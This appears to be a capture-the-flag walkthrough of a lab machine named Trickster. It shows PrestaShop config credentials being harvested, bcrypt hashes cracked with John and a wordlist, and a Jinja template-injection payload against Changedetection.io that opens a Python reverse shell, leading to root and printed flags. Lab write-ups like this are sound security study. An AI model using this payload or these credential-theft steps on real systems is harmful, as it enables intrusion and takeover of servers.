## Recon 



## Prev esc 
in file /var/www/prestashop/app/config/parameters.php we found sql db creds 
```
.<?php return array (
  'parameters' =>
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2024-05-25',
    'locale' => 'en-US',
    'use_debug_toolbar' => true,
    'cookie_key' => '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',

```

in the table of ps_employee you found the following hashes:
$2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm

We cracked a hash

```sh
┌──(root💀lulz-ShoulderRug)-[~]
└─# john --wordlist=./wordlists/rockyou.txt hashes.txt 
Created directory: /sec/root/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 16 to 1024
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:07 0.07% (ETA: 2024-09-27 16:46) 0g/s 167.3p/s 334.7c/s 334.7C/s yamaha1..snuffy
alwaysandforever (?)     
1g 0:00:04:55 0.29% (ETA: 2024-09-27 16:57) 0.003388g/s 169.8p/s 295.7c/s 295.7C/s 240307..yamama
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```
and like that we got user.txt

```sh

www-data@trickster:/home$ su james
su james
Password: alwaysandforever
bash: /home/james: Is a directory
james@trickster:~$ wc -c user.txt
33 user.txt
james@trickster:~$ cat user.txt
091f5f1791090449f1bfb2515ee3a7a6

```
## Lateral movement 
A docker is running on the machine 
```sh
james@trickster:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:82:b7:38:84  txqueuelen 0  (Ethernet)
        RX packets 25165  bytes 24398939 (24.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15794  bytes 3797841 (3.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Port forwarding port 5000  will give us a web server running (Changedetection.io) at it is running a vuln version v0.45.20 and there is already a poc for it [here](https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/).
![[Vuln_change_detc.png]]

Our Payload:
```sh
Notication URL LIST: 
mailto://john@mail.mycompany.com/?to=steve@gmail.com
Notification boddy
        {% for x in ().__class__.__base__.__subclasses__() %}
        {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"172.17.0.1\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read()}}
        {% endif %}
        {% endfor %}
```
Click on send test notification, and like that we got into the docker.
```sh
james@trickster:~$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.17.0.2 48622
root@ae5c137aa8ef:/app# history
history
    1  apt update
    2  #YouC4ntCatchMe#  
```

Like that we got password for root.
```sh
james@trickster:~$ su root
Password: #YouC4ntCatchMe#
root@trickster:/home/james# cd ~
root@trickster:~# ls
changedetection  root.txt  scripts  snap
root@trickster:~# cat root.txt 
df3012d18dbd7a90f02c0bca7a9fd91b
root@trickster:~# 
```